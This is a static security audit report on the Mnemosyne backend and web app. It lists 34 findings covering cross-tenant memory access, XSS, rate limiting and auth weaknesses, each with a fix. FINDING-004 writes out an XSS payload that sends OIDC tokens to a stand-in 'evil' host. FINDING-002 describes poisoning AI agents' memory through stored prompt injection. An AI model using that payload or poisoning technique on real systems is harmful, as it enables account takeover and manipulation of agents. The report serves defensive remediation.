# Mnemosyne — Security Audit

**Engagement:** white-box, source-level (static). No live traffic — the deployed
hosts were not probed; the `security-scope.yaml` for live localhost testing is
drafted and awaiting owner sign-off.
**Date:** 2026-07-12
**Auditor:** authorized internal assessment (repo owner)
**Commit:** `main` @ f972f5b (post-#51)
**Scope:** `mnemosyne-backend` (FastAPI + FastMCP), `mnemosyne-web` (SvelteKit),
compose/CI/config. Third-party deps (FastMCP internals, CyberdyneAuth server)
out of scope.

---

## Executive summary

34 findings. The dominant theme is a **multi-tenant isolation gap**: the per-org
authorization choke point added in PR #49 covers the *repository* store but the
**agent-memory subsystem's organization dimension and delete-by-id path never
consult it** (FINDING-001..003). Combined with an **unsanitized Markdown → XSS**
sink in the web app (FINDING-004) that can steal the `localStorage` OIDC tokens,
and **no rate limiting anywhere** (FINDING-006), these are the priorities.

Good news: SQLi / command-injection / deserialization / SSTI are **clean**; JWT
crypto is sound (RS256 pinned, no alg-confusion); webhook HMAC is constant-time
with replay dedup; CORS is credential-less and strict; Dockerfiles run non-root;
the repository choke point, cross-repo search fix, mass-assignment, and BFLA
admin gating all held up.

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 5 |
| Medium | 6 |
| Low | 12 |
| Informational | 11 |

### Priority fix order
1. **FINDING-001/002/003** — route the memory subsystem (org read, org write,
   delete-by-id) through `is_organization_allowed()`. One root cause, three High.
2. **FINDING-004** — sanitize Markdown (DOMPurify) before `{@html}`.
3. **FINDING-006** — add rate limiting (esp. LLM/embedding + unauth webhook/health).
4. **FINDING-005** — CSP + `X-Frame-Options` (also backstops #004).
5. Mediums 007–010, then Lows.

### Root-cause note for the #49 authorization work
The contextvar choke point is sound **but only wired into
`PostgresRepositoryRepository`**. Every access path that does *not* resolve a
repository through that store — the org-memory use cases, `forget()`, and
`get_doc` — is unguarded, and the contextvar's **unset default is fail-open
(`None` = all orgs)**. Recommend: (a) push the allowed-org set into the memory
store queries, and (b) make the default fail-closed with an explicit opt-out for
the worker/webhook paths.

---

## Skills Run Log

| Hunter | Result |
|---|---|
| auth-flaw / jwt / oauth-oidc / session-flaw | 1 Med, 3 Low, 1 Info; JWT crypto + admin-claim (#102) clean |
| idor / bola-bfla / mass-assignment / excessive-data-exposure | 3 High, 1 Med, 1 Low, 2 Info; repo choke point / BFLA / mass-assign clean |
| sqli / command-injection / path-traversal / deserialization / ssti | 2 Info; **all injection classes clean** |
| ssrf / ssrf-cloud-metadata | 1 Low, 3 Info; no request-driven SSRF |
| cors / csrf / xss / dom-xss / open-redirect / clickjacking | 1 High, 1 Med, 1 Info; CORS/CSRF/DOM-XSS clean |
| secrets-in-code / crypto-flaw / webhook-integrity | 4 Low, 1 Info; HMAC + API-key crypto clean |
| container / rate-limit / s3-misconfig / cicd / info-exposure | 1 High, 3 Med, 3 Low/Info; Dockerfiles + prod compose + MinIO ACL clean |

---

## HIGH

### FINDING-001 — Cross-org read of organization-scoped agent memories
- **Severity:** High · **CWE-639** Authorization Bypass Through User-Controlled Key · **OWASP API1:2023 (BOLA)**
- **CVSS v3.1:** 6.5 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (business impact elevated: cross-tenant)
- **Location:** `app/application/use_cases/memory.py:75` (`recall_organization`); store `app/infrastructure/persistence/repositories/misc.py:505`; reachable via `app/interfaces/api/routers/intelligence.py:299` and MCP `app/interfaces/mcp/server.py:952` (`mnemosyne_recall`)
- **Summary:** The organization dimension of the memory store never calls `is_organization_allowed()`, so any entitled caller reads another org's memories by naming it.
- **Evidence:**
  ```python
  async def recall_organization(self, organization: str, ...):
      rows = await self.memories.list_for_organization(organization, ...)  # no scope check
      return {"organization": organization, "memories": [_view(m) for m in rows]}
  ```
- **Impact:** Caller scoped to `mnemosyne:acme` calls `GET /api/v1/intelligence/organizations/victim-org/memories` (or `mnemosyne_recall(organization="victim-org")`) and reads all of victim-org's durable learnings/decisions/gotchas. The contextvar *is* set here; the store simply ignores it.
- **Remediation:** Gate `recall_organization` on `is_organization_allowed(organization)` (404 when disallowed). Better: pass the allowed-org set into `list_for_organization` and filter in SQL, mirroring the repository store.

### FINDING-002 — Cross-org write / poisoning of organization memories
- **Severity:** High · **CWE-284** Improper Access Control · **OWASP API3:2023 (BOPLA)**
- **CVSS v3.1:** 7.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`
- **Location:** `app/application/use_cases/memory.py:44` (`remember_organization`); `intelligence.py:290`; MCP `server.py:930` (`mnemosyne_remember`)
- **Summary:** Any entitled caller persists memories into an arbitrary org namespace with no scope check.
- **Evidence:**
  ```python
  async def remember_organization(self, organization, *, content, kind, author):
      return await self._save(content=content, kind=kind, author=author, organization=organization)
  ```
- **Impact:** Cross-tenant data poisoning / stored prompt-injection: injected "decisions"/"gotchas" are later surfaced to the victim org's agents via recall.
- **Remediation:** Enforce `is_organization_allowed(organization)` before saving; optionally require the org exist in the enabled set.

### FINDING-003 — Delete any memory by id, ignoring ownership (destructive IDOR)
- **Severity:** High · **CWE-639** · **OWASP API1:2023 (BOLA)**
- **CVSS v3.1:** 8.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`
- **Location:** `app/application/use_cases/memory.py:84` (`forget`); store `misc.py:513`; REST `app/interfaces/api/routers/repositories.py:413` (`delete_memory` — ignores its own `repo_id`); MCP `server.py:974` (`mnemosyne_forget`)
- **Summary:** `forget(memory_id)` deletes by primary key with no org/repo ownership check.
- **Evidence:**
  ```python
  async def forget(self, memory_id: UUID) -> bool:
      return await self.memories.delete(memory_id)   # deletes by PK, no scope check
  ```
- **Impact:** Chains with FINDING-001: `recall_organization` returns each memory's `id`, so an attacker enumerates a victim org's memory UUIDs then deletes them — no guessing needed.
- **Remediation:** Resolve the memory's owner (repo→org) and verify `is_organization_allowed(...)` before delete; 404 otherwise. Never delete by bare PK.

### FINDING-004 — Stored XSS via unsanitized Markdown rendering of GitHub docs
- **Severity:** High · **CWE-79** Cross-site Scripting · **OWASP A03:2021**
- **CVSS v3.1:** 8.3 `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`
- **Location:** `mnemosyne-web/src/lib/components/DocumentViewer.svelte:7,22`
- **Summary:** Indexed repo Markdown (README/docs) is rendered with `marked.parse()` into `{@html}` with **no sanitizer** (`marked` ^15 dropped its `sanitize` option; raw inline HTML passes through).
- **Evidence:**
  ```svelte
  const html = $derived(doc.content ? (marked.parse(doc.content) as string) : null);
  <!-- "trusted internal markdown render" — INCORRECT: content is third-party GitHub data -->
  <article>{@html html}</article>
  ```
- **Impact:** Discovery auto-enables new repos across connected orgs, so anyone with push access to any monitored repo plants `<img src=x onerror="fetch('https://evil/?t='+localStorage.getItem('oidc.user:...'))">`. When an admin opens the doc, JS runs in the Mnemosyne origin and exfiltrates the OIDC **access + refresh tokens** from `localStorage` (`cyberdyneAuthService.ts:21`) → account/API takeover. No CSP to blunt it (FINDING-005).
- **Remediation:** `{@html DOMPurify.sanitize(marked.parse(doc.content), {USE_PROFILES:{html:true}})}` (bundle DOMPurify), or render with raw-HTML disabled. Fix the misleading comment. Add CSP as defense-in-depth.

### FINDING-006 — No rate limiting on any REST / auth / MCP / webhook endpoint
- **Severity:** High · **CWE-770** Allocation of Resources Without Limits · **OWASP API4:2023**
- **CVSS v3.1:** 6.5 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` (financial impact via LLM spend elevates)
- **Location:** `app/main.py:51` (no limiter middleware); confirmed repo-wide (no `slowapi`/`Limiter`/`throttle`)
- **Summary:** Only CORS + error handlers are registered; every endpoint can be flooded.
- **Impact:** Entitled callers flood cost-bearing LLM/embedding routes (`/ask`, `/context-pack`, `/feature-document`, `/search`, `/code-search`, `/intelligence/search`) → unbounded OpenAI spend + DB/CPU load. Unauthenticated `POST /webhooks/github` and `GET /health` have no ceiling either.
- **Remediation:** Add `slowapi` (or gateway usage plan) with per-caller + per-IP buckets; stricter bucket on LLM/embedding + the unauth webhook/health routes; return 429 + Retry-After.

---

## MEDIUM

### FINDING-007 — Unknown-`kid` JWT forces unbounded JWKS refetch (pre-auth DoS amplification)
- **Severity:** Medium · **CWE-770** · **CVSS 5.3** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`
- **Location:** `app/infrastructure/auth/cyberdyne_auth.py:73`
- **Summary:** `kid` (attacker-controlled, read via `get_unverified_header` pre-verification) not in cache → a fresh outbound JWKS GET, with no negative caching. Each malicious request = one upstream fetch.
- **Evidence:**
  ```python
  if kid not in self._keys or expired:
      await self._fetch_jwks()   # unknown kid re-fetches every time
  ```
- **Impact:** Unauthenticated flood of random-`kid` JWTs amplifies into outbound load on CyberdyneAuth's JWKS endpoint and exhausts Mnemosyne's own auth fast-path (10s-timeout httpx per fetch).
- **Remediation:** Add a refresh cooldown — refetch-on-unknown-kid at most once per 30–60s window, independent of the TTL.

### FINDING-005 — No security headers (missing CSP, X-Frame-Options, HSTS)
- **Severity:** Medium · **CWE-1021** · **CVSS 5.4** `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`
- **Location:** `mnemosyne-web/svelte.config.js` (no `kit.csp`; no `hooks.server.ts`); backend `app/main.py:51` (no header middleware)
- **Summary:** No CSP / `X-Frame-Options` / `frame-ancestors` / HSTS on either tier. UI is framable and the FINDING-004 XSS runs with no backstop.
- **Remediation:** Add `kit.csp` (`script-src 'self'`+nonce, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'self'`) or set headers in `hooks.server.ts`; `X-Frame-Options: DENY` + HSTS at app/proxy.

### FINDING-008 — Unauthenticated webhook reads + JSON-parses full body before signature/size check
- **Severity:** Medium · **CWE-770** · **CVSS 5.3** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`
- **Location:** `app/interfaces/api/routers/webhooks.py:23`
- **Summary:** `await request.body()` + `json.loads` run pre-auth with no size cap; the 401 fires after.
- **Remediation:** Content-Length cap (reject > ~1 MB) at proxy and in-app before reading; bound JSON nesting depth.

### FINDING-009 — Unbounded user-supplied `limit` into SQL LIMIT
- **Severity:** Medium · **CWE-770** · **CVSS 5.3** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L`
- **Location:** `app/interfaces/api/routers/intelligence.py:204,215,225,235,302`; `repositories.py:404`; sink `misc.py:492`
- **Summary:** Several `limit: int` params have no `le=` bound (unlike `PageSizeParam`), enabling mass-scrape / DB pressure via `?limit=999999999`.
- **Remediation:** `Annotated[int, Query(ge=1, le=100)]` on every `limit` (reuse `MAX_PAGE_SIZE`).

### FINDING-010 — Dev compose exposes Postgres/Redis/MinIO on 0.0.0.0 with weak/no auth
- **Severity:** Medium · **CWE-732** · **CVSS 6.5** `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
- **Location:** `docker-compose.yml:79,92,104` (postgres `5433:5432`, redis `6379` no auth, minio `9000/9001`)
- **Summary:** Datastore ports mapped to all interfaces; Redis has no password, Postgres/MinIO use static trivial creds, MinIO console exposed. *Production `compose.coolify.yaml` publishes none of these — not affected.*
- **Remediation:** Bind local ports to `127.0.0.1:`, set Redis `requirepass`, drop the MinIO console port, keep creds out of the committed file.

### FINDING-011 — `get_doc` reads a document without the org-scope gate its siblings apply
- **Severity:** Medium · **CWE-639** · **OWASP API1:2023** · **CVSS 4.3** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`
- **Location:** `app/interfaces/api/routers/repositories.py:231`
- **Summary:** `GET /repos/{repo_id}/docs/{doc_id}` fetches the doc directly and only checks `doc.repository_id == repo_id`, skipping the `use_cases.get(repo_id)` org-filtered resolve every other sub-resource route uses. Bounded by needing a valid (repo_id, doc_id) pair for an out-of-scope repo.
- **Remediation:** `await use_cases.get(repo_id)` first (raises for out-of-scope), then fetch doc + verify `repository_id`.

---

## LOW

### FINDING-012 — API-key callers can invoke mutating MCP tools despite "read-only" contract
- **Low · CWE-269 · `api_key_auth.py:34`, `mcp/server.py:930-983`.** `mnem_` keys get the full `mnemosyne` entitlement; `mnemosyne_remember`/`mnemosyne_forget` authorize on it, contradicting the docstring's "read/query only." A "read-only" integration key can poison/delete memories. **Fix:** model a read-only capability on `CallerIdentity` and gate mutating tools, or drop the read-only claim.

### FINDING-013 — API-key callers are always org-unrestricted
- **Low · CWE-284 · `api_key_auth.py:39`, `identity.py:52`.** A key carries the bare `mnemosyne` entitlement → `allowed_organizations` returns `None` (all orgs). No org-scoped keys possible; one leaked key exposes every tenant. **Fix:** store allowed orgs on `ApiKey`, populate `mnemosyne:<org>` or set the contextvar from the key record.

### FINDING-014 — JWT audience not validated (`verify_aud: False`)
- **Low · CWE-287 · `cyberdyne_auth.py:92`.** Fast path checks issuer+exp but disables aud. Since all CyberdyneAuth tokens share `iss`, a token minted for another app passes JWT validation and is admitted if the bearer holds the `mnemosyne` entitlement (confused-deputy). **Fix:** validate `aud` for token types that carry it.

### FINDING-015 — JWKS fast path is not revocation-aware
- **Low · CWE-613 · `cyberdyne_auth.py:190`.** When a JWT embeds `entitlements`, introspection (the revocation-aware path) is skipped, so a revoked-but-unexpired token keeps working until `exp`. **Fix:** force introspection for sensitive/admin ops, or short TTL + `jti` denylist.

### FINDING-016 — Empty webhook secret accepted (manifest path) → forgeable deliveries
- **Low · CWE-347 · `github_connections.py:249`, `webhooks.py:39`, `app_auth.py:82`.** Guard is `is not None`, so a stored empty-string secret makes HMAC verifiable with a known (empty) key; receiver only rejects `None`. Manual connect is safe (`min_length=1`). **Fix:** treat empty/blank as "no secret" → reject.

### FINDING-017 — Fernet key not validated at boot + reused as HMAC state secret
- **Low · CWE-320 · `token_encryption.py:13`, `composition.py:257`.** Empty `token_encryption_key` boots healthy, fails only on first decrypt; the same key signs CSRF `state` (no key separation). **Fix:** validate at startup; derive a distinct HMAC key via HKDF for `signed_state`.

### FINDING-018 — Weak credentials committed in dev compose
- **Low · CWE-798 · `docker-compose.yml:76,101`.** Inline `POSTGRES_PASSWORD: mnemosyne`, `MINIO_ROOT_PASSWORD: mnem…`. Prod file uses `${...}` correctly. **Fix:** move to untracked `.env` via `env_file`.

### FINDING-019 — Insecure non-empty config defaults (MinIO/DB)
- **Low · CWE-1188 · `config.py:21,25-26`.** `minio_secret_key`/`database_url` default to known values; an unset prod var silently falls back to a public secret. **Fix:** default empty, fail-fast at boot when unset in `app_env=production`.

### FINDING-020 — Paginator follows upstream `Link: rel="next"` host without allowlist, forwarding the GitHub token
- **Low · CWE-918 · `github/client.py:127`.** The next-page host comes from the response and `_request` always re-attaches `Authorization: Bearer`. Bounded by trust in api.github.com's TLS identity, but unguarded. **Fix:** assert scheme=https + host==configured API host before following; don't forward auth off-allowlist.

### FINDING-021 — MinIO image uses moving `:latest` tag (dev **and** prod)
- **Low · CWE-1104 · `docker-compose.yml:96`, `compose.coolify.yaml:130`.** Non-reproducible, unsigned image drift in the Coolify deployment. **Fix:** pin to a release tag + digest (CI already does).

### FINDING-022 — Unauthenticated health endpoint discloses dependency status
- **Low · CWE-200 · `health.py:9`.** `GET /health` returns per-component up/down + failing exception class for DB/Redis/MinIO to anonymous callers. **Fix:** bare `{"status":"ok"}` public; detailed checks on an authenticated/internal endpoint.

### FINDING-023 — CI actions pinned to mutable major-version tags
- **Low · CWE-829 · `.github/workflows/ci.yml:37-39,61-62`.** `@v4`/`@v5` not SHAs. Mitigated: `pull_request` (not `_target`), no `${{ github.event.* }}` in scripts, no repo secrets. **Fix:** pin to commit SHAs + Dependabot.

---

## INFORMATIONAL

- **FINDING-024 — MCP auth is per-tool opt-in with a fail-open org-scope default.** `server.py:77`, `org_scope.py:14`. All current tools call `auth()`, but a future tool that forgets is both unauthenticated and (contextvar default `None`) cross-org. **Fix:** enforce `auth()` in one middleware; make the unset scope deny.
- **FINDING-025 — Org scope set only on `EntitledCaller`, not `CurrentCaller`.** `security.py:35`. No data endpoint uses `CurrentCaller` today; latent footgun. **Fix:** set the boundary in one place; fail-closed default.
- **FINDING-026 — Org scope overloads the CyberdyneAuth plan qualifier as an org name.** `identity.py:43`. `mnemosyne:enterprise` → org "enterprise". Fail-closed for access today, fragile if a login ever equals a plan. **Fix:** dedicated `orgs` claim or `mnemosyne:org:<login>` prefix.
- **FINDING-027 — `alert_webhook_url` unvalidated (env-only SSRF-to-IMDS).** `webhook_notifier.py:30`. Operator/env-only, not request-reachable. **Fix:** require https + reject loopback/link-local/RFC1918 at load.
- **FINDING-028 — `github_api_base_url` override unvalidated (env-only).** `config.py:49`. Same class as 020/027; env-only. **Fix:** validate at startup (https; block internal hosts unless dev/test).
- **FINDING-029 — Post-App-creation 303 redirect to GitHub-provided `html_url`.** `github_connections.py:205`. Browser 303, not server fetch; gated by signed `state`. **Fix:** assert `html_url` starts with `github_web_base_url`.
- **FINDING-030 — Protocol-relative open redirect in post-login OIDC `state`.** `auth/callback/+page.svelte:11`. `state` is CSRF-validated by oidc-client-ts; only a self-seeded `//host` path survives. **Fix:** enforce same-origin (`^/(?!/)`) before `assign`.
- **FINDING-031 — Unescaped LIKE wildcards in memory search.** `misc.py:491`. Safely bound (not SQLi); `%`/`_` broaden matches / minor ReDoS. **Fix:** escape metacharacters + cap query length.
- **FINDING-032 — GitHub `full_name`/`path` interpolated into API URLs / MinIO keys.** `github/client.py:239`. No local-FS sink; `RepositoryFullName` regex constrains connect-time input. **Fix:** `urllib.parse.quote` path segments; reject `..` in keys.
- **FINDING-033 — MD5 used for fallback embedding feature-hash.** `pgvector_store.py:230`. Non-security. **Fix (optional):** `blake2b` to silence SAST.
- **FINDING-034 — Missing healthchecks on redis/minio/worker/mcp/web.** `compose.coolify.yaml:55`. Dependents start on `service_started`. **Fix:** add healthchecks + gate on `service_healthy`.

---

## Coverage & blind spots
- **Static only** — no endpoint was exercised live; contextvar request-isolation
  (Starlette/AnyIO context copying) is *assumed* correct and should get a
  regression test asserting request A's org scope never bleeds into request B.
- FastMCP OAuth internals (PKCE/state/redirect_uri) are **delegated to the
  library** and were not audited — do a dependency-level review of the pinned
  `fastmcp` version.
- Worker / webhook paths intentionally run org-unrestricted (never set the
  contextvar) — correct by design, but it makes the fail-open default the single
  most load-bearing assumption (see FINDING-024/025).
- No live cloud/cluster review (no K8s/ECS manifests present); IMDS reachability
  for FINDING-027/028 depends on the deployment platform.
- **A 0-finding class means "clean in the reviewed source," not "unbreakable."**
